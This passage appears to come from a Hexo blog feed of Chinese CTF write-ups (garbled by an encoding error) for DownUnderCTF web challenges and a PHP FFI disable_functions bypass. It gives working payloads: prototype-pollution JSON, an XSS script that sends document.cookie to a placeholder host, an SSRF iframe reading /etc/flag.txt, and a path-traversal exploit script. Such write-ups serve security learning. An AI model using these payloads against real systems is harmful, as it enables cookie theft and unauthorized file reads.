class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">popen</span>(<span class="string">&quot;/readflag&quot;</span>,<span class="string">&quot;r&quot;</span>)%<span class="number">3</span>bwhile+((<span class="variable">$c</span>+%<span class="number">3</span>d+<span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">fgetc</span>(<span class="variable">$b</span>))+!%<span class="number">3</span>d+-<span class="number">1</span>)&#123;<span class="keyword">echo</span>+<span class="title function_ invoke__">chr</span>(<span class="variable">$c</span>)%<span class="number">3</span>b&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/11/16/%E5%88%A9%E7%94%A8FFI%E6%9D%A5%E7%BB%95%E8%BF%87disable-functions/IMG_20241116-222736435.png" class=""><br><img src="/2024/11/16/%E5%88%A9%E7%94%A8FFI%E6%9D%A5%E7%BB%95%E8%BF%87disable-functions/IMG_20241116-231133306.png" class=""><br>å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨èšå‰‘æ¥æ‰§è¡Œ</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>downunderctf</title>
      <link href="/2024/11/16/downunderctf/"/>
      <url>/2024/11/16/downunderctf/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¥å¤ç°å¤ç°å›½é™…èµ›"><a href="#æ¥å¤ç°å¤ç°å›½é™…èµ›" class="headerlink" title="æ¥å¤ç°å¤ç°å›½é™…èµ›"></a>æ¥å¤ç°å¤ç°å›½é™…èµ›</h1><h1 id="co2"><a href="#co2" class="headerlink" title="co2"></a>co2</h1><p>è¿™é¢˜æˆ‘ä»¬çœ‹ä»£ç ä¼šå‘ç°ä»£ç é‡ä¼šç›¸æ¯”å›½å†…çš„æ¯”èµ›å¤§ä¸€ç‚¹,ä½†å…¶å®éš¾åº¦å¹¶ä¸é«˜ã€‚åªæ˜¯å…¶å¼•å…¥äº†æ•°æ®åº“å¯¼è‡´å…¶ä»£ç ç›¸å¯¹éš¾è¯»ä¸€ç‚¹ã€‚å½“å…¶å®éš¾åº¦ä¸é«˜ã€‚</p><img src="/2024/11/16/downunderctf/IMG_20241116-150249836.png" class="">  <p>æˆ‘ä»¬çœ‹ä»£ç å¯ä»¥å‘ç°å…¶åªè¦flagä¸ºâ€trueâ€å°±å¯ä»¥å¾—åˆ°flagã€‚<br><img src="/2024/11/16/downunderctf/IMG_20241116-150527363.png" class=""><br>flagæ˜¯ä¸€ä¸ªä»ç¯å¢ƒå˜é‡è¯»å–flagçš„å˜é‡<br>è€Œåœ¨save_feedbackè·¯ç”±å­˜åœ¨åŸå‹é“¾æ±¡æŸ“é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å°†å˜é‡flagæ±¡æŸ“ä¸ºtrueä¸å°±å¥½äº†</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;rating&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;referred&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="string">&quot;true&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><img src="/2024/11/16/downunderctf/IMG_20241116-150552685.png" class="">  <img src="/2024/11/16/downunderctf/IMG_20241116-150557899.png" class="">  <h1 id="co2v2"><a href="#co2v2" class="headerlink" title="co2v2"></a>co2v2</h1><p>å¥½å§ï¼Œä¸Šæ¬¡ä»–ä»¬åœ¨flagç«¯ç‚¹ä¸ŠçŠ¯äº†ä¸€ä¸ªå¤§é”™è¯¯ï¼Œç°åœ¨æˆ‘ä»¬ç”šè‡³ä¸å†æ‹¥æœ‰å®ƒäº†ã€‚ ç°åœ¨æ˜¯æ—¶å€™å¯¹ä»–ä»¬ä¸€ç›´åœ¨å¼€å‘çš„ä¸€äº›æ–°åŠŸèƒ½è¿›è¡Œç¬¬äºŒæ¬¡æ¸—é€æµ‹è¯•äº†ã€‚</p><p>çœ‹ä¸€ä¸‹æºç å¯ä»¥å‘ç°xssboté‚£ä¸ç”¨æƒ³è€ƒå¯Ÿçš„è‚¯å®šæ˜¯xssäº†</p><p>æŸ¥çœ‹æºç æˆ‘ä»¬å¯ä»¥å‘ç°å»æ˜¯ä½¿ç”¨å¦‚ä¸‹ç±»æ¥åŠ è½½æ¨¡æ¿çš„<br><img src="/2024/11/16/downunderctf/IMG_20241118-211735085.png" class=""><br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">jEnv</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Contains the default config for the Jinja environment. As we move towards adding more functionality this will serve as the object that will</span></span><br><span class="line"><span class="string">    ensure the right environment is being loaded. The env can be updated when we slowly add in admin functionality to the application.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.env = Environment(loader=PackageLoader(<span class="string">&quot;app&quot;</span>, <span class="string">&quot;templates&quot;</span>), autoescape=TEMPLATES_ESCAPE_ALL)</span><br><span class="line"></span><br><span class="line">template_env = jEnv()</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>è¿™é‡Œæˆ‘è§£é‡Šä¸€ä¸‹autoescapeå‚æ•°ï¼Œå½“å…¶å€¼ä¸ºtrueæ˜¯ä¼šè‡ªåŠ¨å°†è¾“å‡ºçš„å­—ç¬¦è¿›è¡Œhtmlå®ä½“ç¼–ç ä»è€Œé¿å…XSSã€‚è€Œæˆ‘ä»¬åœ¨å†™å‰ä¸€é“é¢˜ç›®æ—¶æ˜¯æœ‰å­˜åœ¨åŸå‹é“¾æ±¡æŸ“çš„ã€‚<br><img src="/2024/11/16/downunderctf/IMG_20241118-212234985.png" class=""><br>è€Œè¿™é¢˜å¹¶æœªå¯¹å…¶ä¿®å¤<br>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†å…¶å€¼æ±¡æŸ“ä¸ºfalseä»è€Œè¿›è¡Œxssã€‚<br>æˆ‘ä»¬å†çœ‹äº†ä¸€ä¸‹å…¶ä»£ç å¯ä»¥å‘ç°å¦ä¸€ä¸ªé˜²å¾¡xssçš„æ‰‹ç«¯ï¼Œ</p><p>å…¶è®¾ç½®äº†nonceã€‚æˆ‘æŠŠç›¸å…³ä»£ç å†™å†ä¸‹é¢<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">SECRET_NONCE = generate_random_string()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>(<span class="params">length=<span class="number">16</span></span>):</span><br><span class="line">    characters = string.ascii_letters + string.digits</span><br><span class="line">    random_string = <span class="string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">    <span class="keyword">return</span> random_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_nonce</span>(<span class="params">data</span>):</span><br><span class="line">    nonce = SECRET_NONCE + data + generate_random_string(length=RANDOM_COUNT)</span><br><span class="line">    sha256_hash = hashlib.sha256()</span><br><span class="line">    sha256_hash.update(nonce.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    hash_hex = sha256_hash.hexdigest()</span><br><span class="line">    g.nonce = hash_hex</span><br><span class="line">    <span class="keyword">return</span> hash_hex</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_nonce</span>():</span><br><span class="line">    generate_nonce(request.path)</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬çœ‹ä¸€ä¸‹å…¶ç”Ÿæˆçš„é€»è¾‘å¯ä»¥çŸ¥é“ï¼Œå…¶æ¯æ¬¡è¯·æ±‚æ‰€ç”Ÿæˆä¸ä¸€æ ·çš„åŸå› æœ‰å…¶è·¯ç”±çš„ä¸åŒå¯¼è‡´çš„dataä¸åŒï¼Œå’Œå…¶æ¯æ¬¡éƒ½ä¼šç”±generate_random_string(length=RANDOM_COUNT)æ¥ç”Ÿéšæœºå­—ç¬¦ï¼Œè€Œå…¶é•¿åº¦æ˜¯ç”±RANDOM_COUNTæ¥å†³å®šçš„ã€‚è€Œå…¶SECRET_NONCEå¹¶ä¸ä¼šå½±å“å…¶æ˜¯ä¸€ä¸ªå¸¸é‡ã€‚é‚£ä¹ˆæˆ‘ä»¬åªè¦å°†RANDOM_COUNTæ±¡æŸ“ä¸º0å°±å¯ä»¥åšåˆ°åŒä¸€ä¸ªè·¯ç”±ä¸‹æ¯æ¬¡ç”Ÿæˆçš„nonceçš„å€¼æ˜¯ç›¸åŒçš„ã€‚</p><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ä¸Šä¸€æ¬¡çš„nonceæ¥è¿›è¡Œxssäº†<br>payloadå¦‚ä¸‹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;TEMPLATES_ESCAPE_ALL&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;RANDOM_COUNT&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><img src="/2024/11/16/downunderctf/IMG_20241118-221506983.png" class="">  <p>è¾“å…¥è¿™ä¸ªåæˆ‘ä»¬å‘ç°å…¶nonceçš„å€¼æ˜¯ä¸å˜äº†ï¼Œä½†æ˜¯å…¶è¾“å‡ºçš„å€¼ä»ç„¶æ˜¯ç»è¿‡htmlå®ä½“ç¼–ç çš„ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬æ±¡æŸ“çš„æ˜¯TEMPLATES_ESCAPE_ALLè€Œä¸æ˜¯æ¨¡æ¿ç±»çš„å®ä¾‹ï¼Œæˆ‘ä»¬çœ‹<code>/admin/update-accepted-templates</code>è·¯ç”±ä¼šå‘ç°å…¶é‡æ–°å¯¹template_env.envè¿›è¡Œäº†ä¸€æ¬¡ç±»æ˜¯å®ä¾‹åŒ–çš„èµ‹å€¼<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin/update-accepted-templates&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_template</span>():</span><br><span class="line">    data = json.loads(request.data)</span><br><span class="line">    <span class="comment"># Enforce strict policy to filter all expressions</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;policy&quot;</span> <span class="keyword">in</span> data <span class="keyword">and</span> data[<span class="string">&quot;policy&quot;</span>] == <span class="string">&quot;strict&quot;</span>:</span><br><span class="line">        template_env.env = Environment(loader=PackageLoader(<span class="string">&quot;app&quot;</span>, <span class="string">&quot;templates&quot;</span>), autoescape=TEMPLATES_ESCAPE_ALL)</span><br><span class="line">    <span class="comment"># elif &quot;policy&quot; in data and data[&quot;policy&quot;] == &quot;lax&quot;:</span></span><br><span class="line">    <span class="comment">#     template_env.env = Environment(loader=PackageLoader(&quot;app&quot;, &quot;templates&quot;), autoescape=TEMPLATES_ESCAPE_NONE)</span></span><br><span class="line">    <span class="comment"># TO DO: Add more configurations for allowing LateX, XML etc. to be configured in app</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;success&quot;</span>: <span class="string">&quot;true&quot;</span>&#125;), <span class="number">200</span></span><br></pre></td></tr></table></figure><br>å³æˆ‘ä»¬å†è¾“å…¥<code>&#123;&quot;policy&quot;:&quot;strict&quot;&#125;</code>å³å¯ä½¿å¾—æˆ‘ä»¬è¾“å…¥çš„payloadè¢«åŸæ ·ä¿å­˜è¾“å‡º<br><img src="/2024/11/16/downunderctf/IMG_20241118-222158254.png" class="">  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=&quot;41217e82927a36c2ceddae0c827b572a5ce20af323f1148b7a5077ba30f66324&quot;&gt;fetch(&quot;xxxxx?cookie&quot;+document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="hah-got-em"><a href="#hah-got-em" class="headerlink" title="hah-got-em"></a>hah-got-em</h1><img src="/2024/11/16/downunderctf/IMG_20241116-163031346.png" class=""><p>åˆšæ‰“å¼€webé¡µé¢æ˜¾ç¤ºnot Foundï¼Œçœ‹æºç ä¼šå‘ç°å…¶æ²¡æœ‰ç»™æˆ‘ä»¬æºç ã€‚åœ¨çœ‹åŸå‹dockerfileä¼šå‘ç°å…¶åªå¯¼å…¥äº†ä¸€ä¸ªç»„ä»¶<br><img src="/2024/11/16/downunderctf/IMG_20241116-163430368.png" class=""><br>gotenberg:8.0.3<br>æŸ¥äº†åŸå‹è¿™ä¸ªç»„ä»¶çŸ¥é“æˆ‘ä»¬å¯ä»¥é€šè¿‡curlæ¥è®²htmlï¼Œwordç­‰è½¬ä¸ºpdfã€‚é‚£ä¹ˆæ¼æ´è‚¯å®šä¹Ÿåªèƒ½å‡ºç°åœ¨è¿™é‡Œäº†ï¼ŒæŸ¥äº†ä¸€ä¸‹å¯ä»¥å‘ç°å…¶å­˜åœ¨ssrfæ¼æ´ï¼Œé‚£ä¹ˆå…¶å°±ä¼šå¯¼è‡´æ–‡ä»¶è¯»å–<br><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGOTENBERGGOTENBERGV8PKGMODULESWEBHOOK-7537083">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGOTENBERGGOTENBERGV8PKGMODULESWEBHOOK-7537083</a></p><img src="/2024/11/16/downunderctf/IMG_20241116-163014543.png" class="">  <p>index.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;\\localhost/etc/flag.txt&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -v \</span><br><span class="line">--request POST <span class="string">&#x27;http://192.168.20.144:1337/forms/chromium/convert/html&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;files=@&quot;index.html&quot;&#x27;</span> -o output.pdf</span><br></pre></td></tr></table></figure><img src="/2024/11/16/downunderctf/IMG_20241116-162733136.png" class=""><h1 id="i-am-confusion"><a href="#i-am-confusion" class="headerlink" title="i-am-confusion"></a>i-am-confusion</h1><h1 id="sniffy"><a href="#sniffy" class="headerlink" title="sniffy"></a>sniffy</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;audio/&#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line"><span class="title function_ invoke__">http_response_code</span>(<span class="number">404</span>); <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mime</span> = <span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$mime</span> || !<span class="title function_ invoke__">str_starts_with</span>(<span class="variable">$mime</span>, <span class="string">&#x27;audio&#x27;</span>)) &#123;</span><br><span class="line"><span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>); <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: <span class="subst">$mime</span>&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>å†è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶è¯»å–çš„ä»£ç ã€‚æˆ‘ä»¬åªè¦èƒ½ç»•è¿‡mime_content_typeçš„æ£€æµ‹ï¼Œå³æ£€æµ‹çš„ç»“æœä¸ºaudioå¼€å¤´ã€‚æˆ‘ä»¬æ‰èƒ½è¯»å–ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.txt</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;DUCTF&#123;&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">theme</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;theme&#x27;</span>] == <span class="string">&quot;dark&quot;</span> ? <span class="string">&quot;dark&quot;</span> : <span class="string">&quot;light&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">other_theme</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;theme&#x27;</span>] == <span class="string">&quot;dark&quot;</span> ? <span class="string">&quot;light&quot;</span> : <span class="string">&quot;dark&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = FLAG; <span class="comment">/* Flag is in the session here! */</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;theme&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;theme&#x27;</span>] ?? <span class="variable">$_SESSION</span>[<span class="string">&#x27;theme&#x27;</span>] ?? <span class="string">&#x27;light&#x27;</span>;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬çœ‹çœ‹indexçš„ä»£ç å¯ä»¥çœ‹åˆ°ï¼Œå…¶å°†flagå­˜åˆ°äº†sessionä¸­ã€‚åé¢åˆå°†æˆ‘ä»¬è‡ªå®šä¹‰çš„themeä¹Ÿå­˜åˆ°äº†sessionæ–‡ä»¶é‡Œã€‚é‚£ä¹ˆè¿™ä¸ªsessionçš„éæ–‡ä»¶å¤´éƒ¨åˆ†å…¶å®å°±æ˜¯å¯æ§çš„ã€‚</p><p>è€Œå…¶åˆè¦å…¶MIMEä¸ºéŸ³ä¹æ–‡ä»¶æ‰ä¼šè¿”å›æ–‡ä»¶å†…å®¹ã€‚</p><p>è€Œmime_content_typeçš„æ£€æµ‹æœºåˆ¶æ˜¯æ£€æµ‹å™¨é­”æœ¯å¤´æ–‡ä»¶(Magic File)å¤§éƒ¨åˆ†çš„æ ‡è¯†æ˜¯å†æ–‡ä»¶å¤´ï¼Œä½†ä¹Ÿæœ‰å°‘éƒ¨åˆ†çš„æ–‡ä»¶æ˜¯å†éæ–‡ä»¶å¤´ä½ç½®<br>å¦‚ä¸‹<br><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">MOD æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">æ ‡è¯†ç¬¦ä½ç½®ï¼šåœ¨åç§»é‡ 1080 å­—èŠ‚å¤„ã€‚</span><br><span class="line">è¯´æ˜ï¼šM.Kã€M!K! ç­‰æ ‡è¯†ç¬¦æ˜¯ MOD æ–‡ä»¶çš„ç‰¹å¾ï¼Œç”¨äºè¡¨æ˜éŸ³è½¨æ•°é‡æˆ–æ–‡ä»¶ç‰ˆæœ¬ã€‚</span><br><span class="line">ç”¨é€”ï¼šéŸ³é¢‘æ¨¡å—æ–‡ä»¶æ ¼å¼ï¼Œç”¨äºå­˜å‚¨éŸ³ä¹å’ŒéŸ³è½¨æ•°æ®ã€‚</span><br><span class="line">ISO é•œåƒæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">æ ‡è¯†ç¬¦ä½ç½®ï¼šå¸¸åœ¨åç§»é‡ 0x8000 æˆ– 0x8800ã€‚</span><br><span class="line">è¯´æ˜ï¼šISO æ–‡ä»¶çš„æ–‡ä»¶ç³»ç»Ÿæè¿°ç¬¦é€šå¸¸åœ¨ç‰¹å®šåç§»ä½ç½®ï¼ˆå¦‚ 0x8001 å¼€å§‹çš„ &quot;CD001&quot;ï¼‰ï¼Œè€Œéæ–‡ä»¶å¼€å¤´ã€‚</span><br><span class="line">æŸäº›è§†é¢‘æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">MP4 æ–‡ä»¶ï¼š</span><br><span class="line">æ ‡è¯†ç¬¦ä½ç½®ï¼šftyp é€šå¸¸åœ¨æ–‡ä»¶å¼€å¤´çš„å‡ ä¸ªå­—èŠ‚ä¹‹åï¼Œåç§»é‡å¯èƒ½æ˜¯ 0x20 æˆ–æ›´é åã€‚</span><br><span class="line">è¯´æ˜ï¼šftyp è¡¨æ˜æ–‡ä»¶ç±»å‹ï¼ˆå¦‚ isom è¡¨ç¤º MP4 çš„ ISO åŸºç¡€åª’ä½“æ ¼å¼ï¼‰ã€‚</span><br><span class="line">MKV æ–‡ä»¶ï¼š</span><br><span class="line">æ ‡è¯†ç¬¦ä½ç½®ï¼šEBML æ ‡å¿—é€šå¸¸åœ¨æ–‡ä»¶çš„å¼€å¤´ï¼Œä½†åç»­å…³é”®ä¿¡æ¯å¯èƒ½åç§»è¾ƒè¿œã€‚</span><br><span class="line">ELF å¯æ‰§è¡Œæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">æ ‡è¯†ç¬¦ä½ç½®ï¼šELF æ–‡ä»¶è™½ç„¶æœ‰å¤´éƒ¨é­”æœ¯å­—èŠ‚ 0x7F 45 4C 46ï¼Œä½†å…³é”®ä¿¡æ¯ï¼ˆå¦‚èŠ‚å¤´è¡¨å’Œç¨‹åºå¤´è¡¨ï¼‰åœ¨æ–‡ä»¶ä¸­çš„åç§»ä½ç½®æ˜¯ç”± ELF å¤´éƒ¨æŒ‡å‘çš„ï¼Œå¹¶ä¸æ€»æ˜¯åœ¨å¼€å¤´é™„è¿‘ã€‚</span><br><span class="line">Java Class æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">æ ‡è¯†ç¬¦ä½ç½®ï¼šCAFEBABE é€šå¸¸åœ¨æ–‡ä»¶å¼€å¤´ï¼Œä½†å…·ä½“ç±»ã€æ–¹æ³•å’Œå±æ€§ä¿¡æ¯çš„ä½ç½®ä¾èµ–æ–‡ä»¶çš„ç»“æ„ï¼Œè€Œéæ–‡ä»¶å¼€å¤´ã€‚</span><br><span class="line">æŸäº›è‡ªå®šä¹‰æˆ–åµŒå¥—æ ¼å¼</span><br><span class="line"></span><br><span class="line">åµŒå¥—å®¹å™¨ï¼šä¾‹å¦‚ï¼ŒZIP æ–‡ä»¶ä¸­çš„ç‰¹å®šæ–‡ä»¶ç±»å‹ï¼ˆå¦‚ .docx æˆ– .xlsxï¼‰éœ€è¦å…ˆè§£å‹ï¼Œæ‰èƒ½æ‰¾åˆ°åµŒå¥—æ–‡ä»¶çš„é­”æœ¯å­—èŠ‚ã€‚</span><br><span class="line">åˆ†æ®µæ–‡ä»¶ï¼šä¾‹å¦‚æŸäº›æ—¥å¿—æ–‡ä»¶ï¼Œå…¶ç‰¹å®šæ®µè½ä¸­çš„æ ‡å¿—å¯èƒ½åœ¨åç§»å¤„è€Œéå¼€å¤´</span><br></pre></td></tr></table></figure><br>æœ€ç¬¦åˆè¿™é“é¢˜ç›®çš„æ˜¯modæ–‡ä»¶ã€‚æˆ‘ä»¬å¯ä»¥ç»™<code>session[&#39;theme&#39;]</code>èµ‹å€¼1-4ä¸ªå­—æ¯aåŠ ä¸Š1080å­—èŠ‚ä»¥ä¸Šçš„<code>M.K.</code>ã€‚èµ‹å€¼1-4ä¸ªå­—æ¯çš„ä½œç”¨æ˜¯è°ƒæ•´å™¨åç§»ä½ç½®ä½¿å…¶åç§»é‡1080æ˜¯çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ºæ­£ç¡®çš„æ ‡è¯†ç¬¦Mã€‚<br>expå¦‚ä¸‹<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;LSE&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://192.168.20.144:1337/&#x27;</span>, params=&#123;<span class="string">&#x27;theme&#x27;</span>: <span class="string">&#x27;a&#x27;</span> * i + <span class="string">&#x27;M.K.&#x27;</span> * <span class="number">400</span>&#125;, cookies=cookies)</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://192.168.20.144:1337/audio.php&#x27;</span>, params=&#123;<span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;../../../../tmp/sess_LSE&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></p><img src="/2024/11/16/downunderctf/IMG_20241119-100802509.png" class="">  ]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> å¤ç° </tag>
